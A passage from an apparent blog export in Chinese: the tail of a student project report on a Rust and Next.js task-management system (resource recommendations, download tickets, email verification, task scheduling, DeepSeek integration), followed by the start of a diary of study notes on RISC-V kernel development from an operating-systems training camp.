tb_comment (rid, uid, content, time)\n        VALUES (?, ?, ?, ?)\n        \"#,\n        resource_id,\n        uid,\n        content,\n        Utc::now().timestamp_millis()\n    )\n    .execute(db().await)\n    .await?;\n    Ok(res.last_insert_id() as u32)\n}\n\npub async fn delete_comment(comment_id: u32) -> Result<()> {\n    sqlx::query!(\n        r#\"\n        DELETE FROM tb_comment\n        WHERE id = ?\n        \"#,\n        comment_id\n    )\n    .execute(db().await)\n    .await?;\n    Ok(())\n}\n\npub async fn get_comments(id: u32) -> Result<Vec<Comment>> {\n    let res = sqlx::query_as!(\n        Comment,\n        r#\"\n        SELECT id, content, rid, time, uid\n        FROM tb_comment\n        WHERE rid = ?\n        \"#,\n        id\n    )\n    .fetch_all(db().await)\n    .await?;\n    Ok(res)\n}\n```\n\n#### 2.5.4 资源推荐\n\n简单起见，我们只实现了一个基于资源标签的推荐策略。每个资源的详情页都有一个资源推荐列表。\n\n对于给定资源 $u$，设其拥有的标签为 $tag_u$，其对应的任务为 $task_u$。\n\n然后我们找出当前用户所有参加的任务对应的所有资源，在其中，如果一个资源 $v$，满足 $tag_v \\cap tag_u \\neq \\emptyset$ 那么资源 $v$ 加入推荐列表。\n\n实现代码如下：\n\n```rust\n/// server/src/service/resource.rs\npub async fn get_recommend(uid: u32, task_id: u32) -> Result<Vec<Resource>> {\n    let tags = sqlx::query!(\n        r#\"\n        SELECT DISTINCT value\n        FROM tb_resource_tag WHERE rid IN (\n            SELECT id FROM tb_resource WHERE tid = ?\n        )\n        \"#,\n        task_id\n    )\n    .fetch_all(db().await)\n    .await?\n    .into_iter()\n    .map(|x| x.value)\n    .collect::<Vec<_>>();\n    if tags.is_empty() {\n        return Ok(vec![]);\n    }\n    let participated = repository::task::get_participated(uid)\n        .await?\n        .into_iter()\n        .map(|(task, _)| task.id)\n        .filter(|x| *x != task_id)\n        .collect::<Vec<_>>();\n    if participated.is_empty() {\n        return Ok(vec![]);\n    }\n    let sql = format!(\n        r#\"\n        SELECT DISTINCT tb_resource.id as id\n        FROM tb_resource\n        INNER JOIN tb_resource_tag ON tb_resource.id = tb_resource_tag.rid\n        WHERE tb_resource_tag.value IN ({}) AND tb_resource.tid IN ({})\n        \"#,\n        std::iter::repeat(\"?\")\n            .take(tags.len())\n            .collect::<Vec<_>>()\n            .join(\",\"),\n        std::iter::repeat(\"?\")\n            .take(participated.len())\n            .collect::<Vec<_>>()\n            .join(\",\")\n    );\n    let mut query = sqlx::query(&sql);\n    for tag in tags {\n        query = query.bind(tag);\n    }\n    for task in participated {\n        query = query.bind(task);\n    }\n    let res = query\n        .fetch_all(db().await)\n        .await?\n        .into_iter()\n        .map(|x| x.get(\"id\"))\n        .collect::<Vec<u32>>();\n    if res.is_empty() {\n        return Ok(vec![]);\n    }\n    let sql = format!(\n        r#\"\n        SELECT id, type AS typ, content, name, tid\n        FROM tb_resource\n        WHERE id IN ({})\n        \"#,\n        std::iter::repeat(\"?\")\n            .take(res.len())\n            .collect::<Vec<_>>()\n            .join(\",\")\n    );\n    let mut query = sqlx::query_as::<_, Resource>(&sql);\n    for id in res {\n        query = query.bind(id);\n    }\n    let res = query.fetch_all(db().await).await?;\n    Ok(res)\n}\n```\n\n考虑到这个推荐列表需要多条 sql 语句查询，并且目测会比较耗时，所以获取推荐资源列表单独作为一个接口，并且不由服务端组件进行数据获取。\n\n#### 2.5.5 资源获取鉴权\n\n对于文件资源，如果用户在下载资源时，直接给出其对应文件的下载地址，那么用户在获取到这个地址后可以把这个下载地址给没有参与该资源对应任务的用户，这样会容易造成资源的泄露，会不妥。为此，我们做如下设计：当需要下载一个资源的时候，先像后端发送请求，得到一个 ticket，这个 ticket 有效期很短，然后再根据这个 ticket 从后端获取文件。\n\n```ts\n/// web/src/app/resource/detail/page.tsx\nconst handleFetchResource = async () => {\n\tsetLoading(\"fetch\");\n\ttry {\n\t\tconst res = await fetchResource(request, resource.info.id);\n\t\tif (resource.info.type == \"file\") {\n\t\t\twindow.open(\n\t\t\t\tAPI_URL_REMOTE + \"/resource/download?ticket=\" + res,\n\t\t\t\t\"_blank\",\n\t\t\t);\n\t\t} else {\n\t\t\twindow.open(res, \"_blank\");\n\t\t}\n\t} catch {}\n\tsetLoading(\"\");\n};\n```\n\n```rust\n/// server/src/service/resource.rs\npub async fn generate_ticket(id: u32, file_name: String) -> Result<String> {\n    let ticket = compute_str_md5(format!(\"resource_{}_{}\", id, Utc::now().timestamp_millis()));\n    CACHE\n        .insert(CacheType::ResourceTicket(ticket.clone()), file_name)\n        .await;\n    Ok(ticket)\n}\n\npub async fn check_ticket(ticket: String) -> Result<Option<String>> {\n    if let Some(file_name) = CACHE.get(&CacheType::ResourceTicket(ticket.clone())).await {\n        CACHE.remove(&CacheType::ResourceTicket(ticket)).await;\n        Ok(Some(file_name))\n    } else {\n        Ok(None)\n    }\n}\n```\n\n```rust\n/// server/src/router/resource.rs\n#[handler]\npub async fn fetch(req: &mut Request, depot: &mut Depot) -> RouterResult {\n    let id = req\n        .query::<u32>(\"resource_id\")\n        .ok_or(AppError::ArgumentError)?;\n    let context = depot.obtain::<AppContext>().unwrap();\n    let resource = service::resource::get(id).await?;\n    let task = service::task::get_with_resource(id)\n        .await?\n        .ok_or(anyhow!(\"资源不存在\"))?;\n    if !service::task::is_participated(context.user.uid, task.id)\n        .await?\n        .is_some()\n        && task.publisher != context.user.uid\n        && !context.permissions.manage_all_task()\n    {\n        return Err(AppError::PermissionDenied);\n    }\n    // TODO 写到这里突然发现 Resource 结构体里的 typ 应为 ResourceType，但是已经懒得改了\n    let typ = resource.typ.as_str();\n    match typ {\n        \"link\" => {\n            return Ok(resource.content.into());\n        }\n        \"file\" => {\n            let ticket = service::resource::generate_ticket(id, resource.content).await?;\n            return Ok(ticket.into());\n        }\n        _ => {\n            return Err(anyhow!(\"未知资源类型\").into());\n        }\n    };\n}\n\n#[handler]\npub async fn download(req: &mut Request, res: &mut Response) {\n    let app_result = async_func(async {\n        let ticket = req\n            .query::<String>(\"ticket\")\n            .ok_or(AppError::ArgumentError)?;\n        let file_name = service::resource::check_ticket(ticket)\n            .await?\n            .ok_or(anyhow!(\"ticket 无效或已过期，请重试\"))?;\n        let file_path = format!(\"data/files/{}\", file_name);\n        res.send_file(&file_path, req.headers()).await;\n        Ok(().into())\n    })\n    .await;\n    match app_result {\n        Ok(_) => (),\n        Err(e) => {\n            res.render(e);\n        }\n    };\n}\n```\n\n### 2.6 总结\n\n本项目宏观上使用了前后端分离的架构。\n\n对于前端，使用了 React 作为主要的技术栈，使用 Material Design 风格进行 UI 界面的设计。使用 Next.js 来进行 SSR（服务端渲染）。并且前端界面是响应式的，能够在不同大小的设备上有良好呈现。并使用了防抖等技术。\n\n对于后端，使用 Rust 语言进行编写，Salvo 作为主要的后端框架，采用类似 MVC 结构的 router-service-repository 分层，实现了较好的异常处理，日志管理，配置文件加载。使用 MySQL 进行数据的可持久化。\n\n对于用户，支持用户登录，用户注册，注册时发送邮件验证码验证。支持灵活的用户权限管理。支持关键词用户搜索。\n\n对于任务，支持任务增删改查，支持任务之间的依赖，支持任务分配小组，并做到根据任务依赖关系、优先级、预计耗时、截止时间，使用拓扑排序和优先队列安排任务执行顺序。接入了 DeepSeek 来实现任务的时间分配建议和休息建议。支持对任务进行自动紧急/重要四象限分类。\n\n对于资源，支持增删改查，支持资源的点赞/点踩，支持评论，支持增删标签，支持基于标签的资源推荐。\n\n## 三. 实验收获\n\n### 3.1 架构\n\n在本次大作业之前已经很久没接触过前后端项目了，这次大作业又重新复习了一下前后端开发。并摸索出 router-service-repository 的后端分层架构和服务端组件请求数据，数据注入到客户端组件的前端 SSR 的架构。不过我仍发现目前的结构可能存在一些问题：\n\n一个是 repository 的必要性，本项目中 service 层中很多代码都是直接转发 repository 的函数，似乎 repository 的分层有点多余。也可能是本项目业务逻辑比较简单，几乎都是简单的数据库操作的原因。\n\n另一个是 SSR 的利用似乎不足。由于本项目为了清楚地分离服务端组件和客户端组件，直接让服务端组件只负责数据的获取，几乎所有的渲染都还是由客户端组件承担，这使得本项目严格意义上并不能算作一个 SSR。我们仍需要继续探索 SSR 的最佳实践。\n\n### 3.2 技术\n\n通过本次大作业我强化了对 rust 语言的应用，在 6 个月前我还不能使用 rust 写一个简单的 crud 的后端程序。同时我也熟悉了 rust 的开发生态，对一些 rust 库有了一些了解。\n\nNext.js 在国内的资料比较少，同时 Next.js 中间出现过较大的版本变化，这使得即使询问 ai 很多时候也无法得到满意的结果。本次大作业中我踩了 Next.js 的一些坑，如中间件的路由匹配，中间件获取的数据传递给后续服务端组件等。\n\n同时这次大作业我一开始考虑使用 orm，但后续因为一些原因放弃，转而手写 sql 语句，也强化了 sql 语句的知识，特别是联表查询。\n\n### 3.3 大模型利用\n\n在本次大作业最后我突然想到可以接入 deepseek，并花了半天的时间简单的完成了接入。这是我首次尝试在一个项目中接入大模型，我感觉对于大模型的利用还有很多可以发挥的地方。\n\n### 3.4 面向对象的思考\n\n本项目在业务逻辑部分几乎没有用到面向对象，这也让我产生了关于面向对象的一些思考。一个类，和结构体+函数，函数传递结构体引用进去，似乎本质相同。那么面向对象的意义在哪里？我认为多态是面向对象的核心，没有利用到多态的话，面向对象就是假的。以及我认为要以业务逻辑优先，如果一个业务逻辑并不需要用到面向对象，那么强行套面向对象也是无意义的。以本项目举例，本项目至少在我的设计下，无论是用户、任务还是资源，都不需要涉及到多态。即使考虑到后面的拓展，那也应该视后续具体的业务需求而定。而且，对于一个前后端项目，数据的持久化是放在关系型数据库中的，本身不太可能搞成复杂的对象。以及后端的所有操作基本都是在一个请求里进行的，进行复杂的对象操作也不合适。除非是一些较为特殊的逻辑，不然难以遇到一定使用面向对象才好解决的场景。本次作业给出的需求我认为并不适合，或者说不是一定需要用面向对象。\n\n## 四. 实验扩展\n\n### 4.1 邮箱验证\n\n我们实现了注册时需要通过邮箱验证才能完成注册。\n\n邮箱使用阿里云的企业邮箱，绑定了自己的域名：`gcteamo.com` 。\n\n![image-20250523201958388](http://pic.caiwen.work/i/2025/05/28/6836f914048ee.png)\n\n使用 lettre 库来进行邮件的发送，具体细节见 `server/src/mail.rs` 。\n\n![image-20250523202334541](http://pic.caiwen.work/i/2025/05/28/6836f9270fffb.png)\n\n后端还提供一个验证邮件的接口，客户端拿用户输入的验证码请求该接口，如果验证码正确，那么客户端会下发一个 ticket 。\n\n```rust\n/// server/src/router/user.rs\n#[handler]\npub async fn email_verify(req: &mut Request) -> RouterResult {\n    let arg: EmailVerifyForm = req.extract().await?;\n    if arg.validate().is_err() {\n        return Err(AppError::ArgumentError);\n    }\n    let ticket = service::user::verify_email_code(arg.email.as_str(), arg.code)\n        .await?\n        .ok_or(anyhow!(\"验证码错误\"))?;\n    Ok(ticket.into())\n}\n```\n\n拿到 ticket 就可以证明邮箱的所有权了。后续需要证明邮箱所有权的接口，如用户注册，找回密码，都需要提供 ticket。\n\n为了防止邮件发送接口被滥用，我们设置了一个频率限制，即每个邮件地址每分钟只能发一个邮件。\n\n```rust\n/// server/src/router/user.rs\n#[handler]\npub async fn email_send(req: &mut Request) -> RouterResult {\n    let email: String = req.query(\"email\").ok_or(AppError::ArgumentError)?;\n    if !email.validate_email() {\n        return Err(AppError::ArgumentError);\n    }\n    if CACHE\n        .get(&CacheType::EmailCodeLock(email.clone()))\n        .await\n        .is_some()\n    {\n        return Err(anyhow!(\"发送验证码频繁，请稍后再试\").into());\n    }\n    service::user::send_email_code(email.as_str()).await?;\n    // CACHE 是 moka 实例，见 server/src/cache.rs\n    CACHE\n        .insert(CacheType::EmailCodeLock(email.clone()), \"1\".to_string())\n        .await;\n    Ok(().into())\n}\n```\n\n验证码有效期也是类似的手段实现的。\n\n### 4.2 拓扑排序和优先队列\n\n我们希望首页显示的任务是按照一个较好的顺序给出的。具体来说，我们需要保证按照首页的排列顺序从上到下依次做任务，能解决任务的依赖关系（父任务在上，子任务在下），同时更紧急的任务先做（同等剩余时间，优先级越高越先做。同等优先级，剩余时间越小越先做）。为此，我们应用了拓扑排序算法来解决依赖关系。传统拓扑排序算法是一个普通队列，为了满足“更紧急的任务先做”这个要求，我们使用优先队列来维护。算法的代码如下：\n\n```rust\nstruct WeightWrapper<T> {\n    deadline: u64, // 截止时间小的先做\n    weight: u32,   // 截止时间相同时，权重小的先做\n    inner: T,\n}\nimpl<T> Ord for WeightWrapper<T> {\n    fn cmp(&self, other: &Self) -> Ordering {\n        if self.deadline == other.deadline {\n            other.weight.cmp(&self.weight)\n        } else {\n            other.deadline.cmp(&self.deadline)\n        }\n    }\n}\nimpl WeightWrapper<(Task, bool)> {\n    fn new(task: Task, finish: bool) -> Self {\n        Self {\n            deadline: task.info.deadline,\n            // 权重并不是直接为优先级，而是 预计耗费时间 / 优先级\n            weight: task.info.cost / (u32::from(task.info.priority) + 1),\n            inner: (task, finish),\n        }\n    }\n}\npub async fn arrange_task(list: Vec<(Task, bool)>) -> Vec<(Task, bool)> {\n    let mut deg = HashMap::new(); // 每个点的入度\n    let mut tasks = HashMap::new(); // 根据编号获得任务实体\n    let mut que = BinaryHeap::new(); // 优先队列\n    let mut g = HashMap::new(); // 邻接表\n    let mut res = Vec::new(); // 结果\n    for (task, finish) in list {\n        if let Some(prev) = task.prev {\n            g.entry(prev).or_insert(vec![]).push(task.id);\n            *deg.entry(task.id).or_insert(0) += 1;\n        } else {\n            que.push(WeightWrapper {\n                deadline: task.info.deadline,\n                weight: task.info.cost / (u32::from(task.info.priority) + 1),\n                inner: (task.clone(), finish),\n            });\n        }\n        tasks.insert(task.id, (task, finish));\n    }\n    while let Some(WeightWrapper {\n        deadline: _,\n        weight: _,\n        inner: (task, finish),\n    }) = que.pop()\n    {\n        if let Some(next_tasks) = g.get(&task.id) {\n            for next_id in next_tasks {\n                let next_deg = deg.get_mut(next_id).unwrap();\n                *next_deg -= 1;\n                if *next_deg == 0 {\n                    let (next_task, next_task_finish) = tasks.remove(next_id).unwrap();\n                    que.push(WeightWrapper::new(next_task, next_task_finish));\n                }\n            }\n        }\n        res.push((task, finish));\n    }\n    res\n}\n```\n\n### 4.3 接入 DeepSeek\n\n作业中的 “最优时间分配建议” 和 “学习疲劳预警” 这项功能，如果使用传统的算法不太好实现，即使实现效果也难以保证。因此，我们考虑直接接入大模型，借助大模型来实现这个功能。\n\n在 deepseek 开放平台上购买相应的额度。\n\n![image-20250523211446896](http://pic.caiwen.work/i/2025/05/28/6836f9461dede.png)\n\n根据用户当前参与的，且没过期的任务，构造提示词：\n\n```rust\nlet prompt = task\n    .into_iter()\n    .map(|(task, _)| {\n        let seconds = task.info.deadline / 1000;\n        let nanos = (task.info.deadline % 1000) * 1_000_000; // 转换为纳秒\n        let utc_time = DateTime::<Utc>::from_utc(\n            NaiveDateTime::from_timestamp_opt(seconds as i64, nanos as u32).unwrap(),\n            Utc,\n        );\n        // 转换为 UTC+8\n        let utc_plus_8 = FixedOffset::east_opt(8 * 3600).unwrap();\n        let beijing_time = utc_time.with_timezone(&utc_plus_8);\n\n        format!(\n            \"<begin>{}\\n{}\\n{}\\n{}<end>\",\n            task.info.title,\n            beijing_time.format(\"%Y-%m-%d %H:%M\"),\n            match task.info.priority {\n                crate::entity::task::TaskPriority::High => \"高优先级\",\n                crate::entity::task::TaskPriority::Medium => \"中优先级\",\n                crate::entity::task::TaskPriority::Low => \"低优先级\",\n            },\n            task.info.cost\n        )\n    })\n    .collect::<Vec<_>>()\n    .join(\"\\n\");\nlet data = json!({\n    \"model\": \"deepseek-chat\",\n    \"messages\": [\n        {\n            \"role\": \"system\",\n            \"content\": r#\"你现在是一个时间规划大师，我将给你若干个任务，每个任务以<begin>开始<end>结束，每个任务包含多行信息，具体地，第一行为任务的名称，第二行为任务的截止时间，第三行为任务的优先级，第四行为任务的预计耗时。你需要为我安排一个时间规划方案。规划方案可以根据当前日期考虑其他外界因素。规划方案可以添加休息建议，注意劳逸结合。注意，你只需要给出规划方案和规划理由，其他的任何内容都不要回答。你的回答应简短\"#\n        },\n        {\n            \"role\": \"user\",\n            \"content\": prompt\n        }\n    ],\n});\n```\n\n构造后提示词大概是这样：\n\n```\n你现在是一个时间规划大师，我将给你若干个任务，每个任务以<begin>开始<end>结束，每个任务包含多行信息，具体地，第一行为任务的名称，第二行为任务的截止时间，第三行为任务的优先级，第四行为任务的预计耗时。你需要为我安排一个时间规划方案。规划方案可以根据当前日期考虑其他外界因素。规划方案可以添加休息建议，注意劳逸结合。注意，你只需要给出规划方案和规划理由，其他的任何内容都不要回答。你的回答应简短\n<start>\n测试任务aaaa\n2025-05-25 12:30\n中优先级\n100分钟\n<end>\n<start>\n小组任务\n2025-08-01 12:00\n高优先级\n100000000分钟\n<end>\n```\n\n根据其 api 文档：https://api-docs.deepseek.com/zh-cn/api/create-chat-completion，发送请求并解析：\n\n```rust\n#[derive(Deserialize)]\nstruct DeepSeekResponse {\n    pub id: String,\n    pub object: String,\n    pub created: u64,\n    pub model: String,\n    pub choices: Vec<DeepSeekChoice>,\n}\n#[derive(Deserialize)]\nstruct DeepSeekChoice {\n    pub index: u32,\n    pub message: DeepSeekMessage,\n    pub finish_reason: String,\n}\n#[derive(Deserialize)]\nstruct DeepSeekMessage {\n    pub role: String,\n    pub content: String,\n}\n\nlet client = get_client().await;\nlet response = client\n    .post(\"https://api.deepseek.com/chat/completions\")\n    .json(&data)\n    .send()\n    .await?;\nif response.status() != 200 {\n    match response.status().as_u16() {\n        401 => return Ok(\"DeepSeek 密钥错误，请联系管理员解决\".to_string()),\n        402 => return Ok(\"DeepSeek 额度不足，请联系管理员解决\".to_string()),\n        429 => return Ok(\"DeepSeek 请求过于频繁，请稍后再试\".to_string()),\n        500 => return Ok(\"DeepSeek 服务器错误，请稍后再试\".to_string()),\n        503 => return Ok(\"DeepSeek 服务器繁忙，请稍后再试\".to_string()),\n        _ => return Ok(format!(\"请求 DeepSeek 失败，错误码：{}\", response.status())),\n    }\n}\nlet response = response.json::<DeepSeekResponse>().await?;\nOk(response\n    .choices\n    .get(0)\n    .ok_or(anyhow!(\"DeepSeek 返回空响应！\"))?\n    .message\n    .content\n    .clone())\n```\n\n由于大模型的生成比较慢，我们会先把大模型的响应放到数据库中缓存，每次获取时间安排方案的时候直接从数据库里获取。如果当前参加的任务有变动，则需要用户手动更新。\n\n![image-20250523212242078](http://pic.caiwen.work/i/2025/05/28/6836f97897bde.png)\n\n大模型生成的内容是 markdown 格式的，为了在前端很好地呈现，我们使用 markdown-it 来渲染 markdown，并采用 github 的 markdown 主题。\n\n我们平常使用的大模型都采用了 SSE（服务端推送）的技术。这个技术可以做到大模型生成了什么就先返回什么，不必等到完全生成。由于大模型生成速度比较慢，目前的实现中，用户在手动更新后会有一个较长的等待时间，不太友好。理论上采用 SSE 的话会有更好的用户体验，但由于时间原因，我们没有做这一点。\n\n","summary":"FuzzyEnigma是一个基于Rust和Next.js的任务管理系统，支持用户权限管理、任务依赖、资源推荐及AI时间规划建议，实现了前后端分离与SSR架构。","key":["rust","开发","ts","前端","后端","湖南大学"],"tags":[],"path":["开发","项目","程序设计大作业实验报告.md"],"background":"http://pic.caiwen.work/i/2025/05/28/683702b0de8b3.jpg","recommend":true,"status":"published"},{"type":"Article","title":"2025春操作系统训练营游记（一二阶段）","id":"2025-os-camp-2","createTime":"2025-05-02T09:09:00.000Z","updateTime":"2025-09-05T13:34:06.675Z","content":"\n## 2025-??-??\n\n从一个公众号上得知了这个训练营并报名\n\n本来就对rust和os感兴趣，中间断断续续在图书馆抱着 programming rust 看，以及看 csapp 和 x86汇编-从实模式到保护模式\n\n## 03-31 ~ 04-05\n\n突然发现训练营已经开始了。根据说明，搞好了 rustlings 。第一次接触这种形式的练习感觉很新奇\n\nrustlings 前面大部分内容之前已经了解过了，于是很快就做完了。后面的进阶的知识比较陌生，于是又在图书馆专门看完了 programming rust 的并发和宏等章节。在清明节的第二天晚上赶完了 rustlings，结果提交后发现还差 12 分，发现 quiz 和 10 个算法相关的练习还没做，于是又通宵做完，可算是晋级了\n\n## 04-06\n\n初步搭建好了实验环境。发现高数作业还有8页没写完，赶紧去补了（）\n\n## 04-07\n\n看了一下指导文档，发现很多地方讲的不是很详细，还以为需要很多前置知识。就在准备继续去看 csapp 补前置知识的时候发现原来还有个详细版本的 rCore 文档，训练营的指导文档只是精简版本\n\n看完了第一章，初步对内核的基本结构和 riscv 有了点了解，感觉意犹未尽...\n\n### riscv寄存器\n\nx0/zero 寄存器恒恒为零\n\nx1/ra 寄存器存放当前函数调用结束之后的返回到的地址，由被调用者保存\n\nx2/sp 寄存器存放栈指针，由被调用者保存。开栈时，sp 减小，[新sp, 旧sp) 部分即为新开的栈空间\n\nx3/gp 寄存器在程序运行期间不会发生变化，调用过程中无需保存\n\nx4/tp 寄存器同上\n\nx5~x7 和 x28~x31（又被合称为 t0~t6） 寄存器调用者保存\n\nx8~x9 和 x18~x27（又被合称为 s0~s11） 寄存器被调用者保存\n\n其中，s0/fp 寄存器既可以作为一个临时寄存器，也可以作为栈帧指针（即指向栈的起始位置）的寄存器。是被调用者保存寄存器。\n\nx10~x17（又被合称为 a0~a7） 用来传递参数，调用者保存。其中 a0 和 a1 还用来保存返回值\n\n## 04-09（特权级切换）\n\n看完了第二章，跟着完整的敲了一遍代码\n\n这一章为了实现在操作系统上运行应用程序，引入了特权级机制。特权级机制是软硬件配合得以实现的\n\n在用户模式下，一些可能破坏计算机系统的指令会被限制执行。需要程序调用系统内核提供的接口来间接执行这些指令。而调用这些内核提供的接口时，CPU会从用户模式切换到监督模式，内核操作完毕之后CPU又会用监督模式切换到用户模式。模式之间的切换称为陷入。\n\n`ecall` 指令可以从用户模式切换到监督模式\n\n具体来说，内核在启动时会在 `stvec` 寄存器中设置处理函数的地址。当用户模式的程序调用 `ecall` 时，CPU 将跳到 `stvec` 寄存器中设置的地址处（当然不一定是 `ecall` 指令才会触发，其他异常也会触发），并设置如下寄存器的值\n\n- `sstatus` ：发生 trap 之前 CPU 处于哪个特权级\n- `sepc`：记录 trap 发生之前执行的最后一条指令的地址\n- `scause`：描述 trap 发生的原因\n- `stval`：其他附加信息\n\n而处理函数要执行的话就需要使用栈，如果应用程序和内核的处理函数共用一个栈，那么会带来安全隐患。因此需要单独开辟一个内核栈和一个用户栈\n\n同时，由于 ecall 也相当于是一个函数调用，所以需要在调用时保存当前上下文。由于应用程序和内核是两个程序，所以保存上下文的时候需要把所有通用寄存器都保存一遍\n\n为了方便上下文保存和两个栈之间的切换，还有一个 `sscratch` 寄存器可以让我们用来保存用户栈/内核栈的指针\n\n`stvec`、`sstatus`、`sepc`、`scause`、`stval`、`sscratch` 寄存器被称为 CSR（控制状态寄存器），在进行读写的时候需要使用 `csrrw`，`csrr`，`csrw` 指令进行操作\n\n于是在上下文都保存好之后，处理函数的就会根据 ecall 提供的参数，进行不同的操作。所有操作结束之后，再将上下文还原，根据 `sepc` 的值，使用 `sret` 指令跳回到用户模式\n\n对于初始时从监督模式跳到用户模式，只需要构造一个 trap 上下文（主要是设置 sepc）并使用 sret 指令即可跳入用户模式\n\n### rust指针操作相关笔记\n\n`ptr` 为一个指针类型\n\n`ptr.read_volatile();` 读取指针指向数据\n\n`ptr.write_volatile();` 写指针\n\n`core::slice::from_raw_parts(ptr, cnt)` 将 `ptr` 到 `ptr + cnt` 转为一个不可变引用切片\n\n`core::slice::from_raw_parts_mut(ptr, cnt)` 将 `ptr` 到 `ptr + cnt` 转为一个可变引用切片\n\n`slice.copy_from_slice(slice2)` 将 `slice2` 数据复制到 `slice`\n\n### 内存布局\n\n![](https://rcore-os.cn/rCore-Tutorial-Book-v3/_images/MemoryLayout.png)\n\n- .bss 保存程序中未初始化的全局数据，应当在程序加载时由程序或者加载者将其清零\n- .rodata 保存只读的全局数据，如一些常亮、字符串\n- .data 保存可以被修改的全局数据\n- .text 保存代码\n\n由于 rust 可能会对内存布局进行一些优化，所以当 rust 需要与 汇编/其他编程语言 进行交互时，需要设置内存布局是兼容 C 语言的。如在需要与汇编进行交互的结构体上添加 `#[repr(C)]`\n\n## 04-10~04-11（分时多任务）\n\n花了两天的时间完成了第三章并完成了相应的实验\n\n第三章实现了将程序全部加载到内存中并对程序的运行进行分时的调度\n\n首先是多道程序的放置与加载。由于目前还没有上虚拟内存，所以需要用一个 python 脚本设置好每个应用程序链接到的地址。于是在内核初始化时就可以一口气把所有的程序都载入内存了\n\n我们把所有内存都载入内存是想实现程序的任务的调度和切换\n\n本章首先实现了一个协作式调度，即程序运行时可以调用一个 `yield` 的系统调用，主动让出 CPU 的所有权，然后内核会暂停当前程序，转而去执行其他的程序。`yield` 被调用之后，内核像上一章一样保存 trap 上下文并调用 trap_handler，在 trap_handler 中标记当前任务状态为暂停然后切换到其他任务\n\n考虑如何切换任务，一个任务被切换出去后相当于这个任务停在了 trap_handler，而被切换回来相当于继续完成 trap_handler 。那么总的来说内核在任务切换前后仍然是继续完成 trap_handler，但是上下文却发生了不同。我们引入 `__switch` 函数来实现上下文的切换。既然上下文不同了，那么相当于每个任务都应该有一个独立的内核栈。任务会发生切换，因此也应该有个独立的用户栈。`__switch` 在切换任务时应该做到切换到目标任务的内核栈（顺着目标任务的内核栈继续往下执行即可切换到目标任务的用户栈，所以用户栈不用考虑），并且寄存器恢复到原来目标任务被中断时的状态。`__switch` 函数没有什么特殊的，我们把它看作一个函数调用，于是编译器会自动为我们生成调用者保存寄存器的保存与恢复的代码，但 `__switch` 是汇编实现的，需要我们手动处理被调用者保存寄存器的保存和恢复。我们把这些被调用者保存寄存器的信息称为 task 上下文，保存切换出去的任务的 task 上下文到内核，恢复切换回来的 task 上下文（由于 `sp` 也是被调用者保存寄存器，因此也顺带完成了切换内核栈的过程）\n\n但考虑到很多程序可能并没有主动让出的意识，于是本章又实现了时间片轮转调度\n\n在 CPU 中 `mtime` 寄存器保存了 CPU 自上电以来经过了多少时钟周期。同时还有一个 `mtimecmp` 寄存器。当 `mtime` 的值超过了 `mtimecmp` 的值就会触发时钟中断\n\n于是我们有了这样的实现：初始时设置 `mtimecmp` 为 10ms 之后的时钟周期（可以通过 CPU 的时钟频率计算得到），于是 10ms 后时钟周期会被触发，内核强制暂停当前任务并切换到下一个任务，然后再把 `mtimecmp` 设置为下一个 10ms 之后的时钟周期\n\n### 中断屏蔽\n\n- 如果中断特权级低于 CPU 当前特权级，则该终断会被屏蔽，不会被处理\n- 否则，继续判断相应的 CSR 来判断该中断是否会被屏蔽\n\n在第二点中，控制中断是否被屏蔽的 CSR 有 sstatus 和 sie\n\n如果 sstatus 的 sie 字段设为 0 则屏蔽所有 S 特权级的中断，反之则继续看 sie\n\nsie 有三个字段 ssie/stie/seie 分别控制 S 特权级的软件中断，时钟中断和外部中断\n\n指导书最后一段话不太清楚是不是可以理解为：在 U 态时触发的 S 特权中断，判断中断是否被屏蔽时跳过 sstatus 的 sie 字段的校验\n\n### 嵌套中断\n\n中断发生时，sstatus 的 sie 字段会先被保存到 spie 字段，然后 sie 字段清零，后续所有 S 特权级的中断都会被屏蔽\n\n当 sret 指令返回到被中断打断的地方之后，硬件会把 sie 字段恢复为 spie 字段的值\n\n因此默认情况下不会发生同等级的嵌套中断，但可能还会嵌套更高级别的中断\n\n### 本章有一个大坑\n\n我照着指导书敲了一遍代码之后发现神秘bug，有的用户程序在调用 println 后触发了 IllegalInstruction 的 trap，有时候甚至触发 InstructionFault 。开始我在代码中插入一些 println 语句来看大概是哪个地方出现了问题，发现是 `__switch` 函数调用时发生问题。于是考虑 gdb 调试，单步调试发现 `__switch` 函数已经成功切换上下文并将控制权交给了用户程序，上述异常是用户程序触发的，但应用程序中只有 println。由于 rust 编译后的代码加了很多内容（毕竟 println 宏并非单纯的系统调用，还有 fmt 相关的东西），所以不太能调试。\n\n后续问 ai 得知触发异常的 trap 之后 sepc 会储存发生异常的指令的地址。然后我在内核代码里输出了一下，更灵异了：异常指令的地址是一块未被使用的内存。此时我考虑可能是程序链接出现了什么问题，于是各种排查...\n\n最终发现，指导书上的多道程序在链接的时候是用 python 脚本修改 linker.ld 的 BASE_ADDRESS 来让程序加载到不同的位置，而仓库代码却是在编译时传递 `-Clink-args=-Ttext=地址` 的方法来指定链接位置。前者有概率会出现奇怪 bug，会让我们的用户程序未链接到我们期望的位置，这就导致程序在执行的过程中跳到了某个未被使用的内存，从而触发上述异常。\n\n### gdb 的一些使用笔记\n\n`break [symbol]/[*address]` 在某个符号或者地址处打断点\n\n`clear [symbol]/[*address]` 清除某个符号或者地址处的断点\n\n`info breakpoints` 可以查看当前所有断点\n\n`delete 3` 删除某个编号的断点\n\n`display/i $pc` 可以在每条指令执行结束后显示一下指定的寄存器/地址的内容，可以用来持续监控\n\n`p/x $寄存器名` 可以以十六进制显示某个寄存器的值\n\n`disas` 反编译当前函数\n\n`disas [symbol]` 反编译指定函数\n\n`disas /m 开始地址,结束地址` 反编译指定地址范围的指令\n\n其中的参数可选\n\n- `/m` 显示源代码和汇编代码混合视图\n- `/r` 显示原始指令码\n- `/s` 显示汇编代码大小\n\n### 反汇编工具\n\n`rust-objdump -S [elf]` 可以反汇编某个 elf 文件，但是只反汇编 .text 段\n\n`rust-objdump -S -D [elf]` 反汇编所有的段\n\n## 04-13~04-16（虚拟内存）\n\n内容非常多的一章！\n\n本章首先先实现了如何让内核得以实现动态内存分配，这样内核就可以使用堆了，与此同时一些数据结构也能够被使用。实现的过程大概是采用了一个第三方的 crate 实现堆内存分配算法，然后堆是在 bss 段中提前开好的。\n\n然后是本章重头戏：虚拟内存。首先是建立页表，具体来说：本章的代码中，FrameAllocator 来自动分配一个物理页。为了让物理页能够被 Rust 自动管理，我们创建一个结构体 FrameTracker ，类似智能指针那样包裹物理页编号，并为其实现 Drop trait，在 FrameTracker 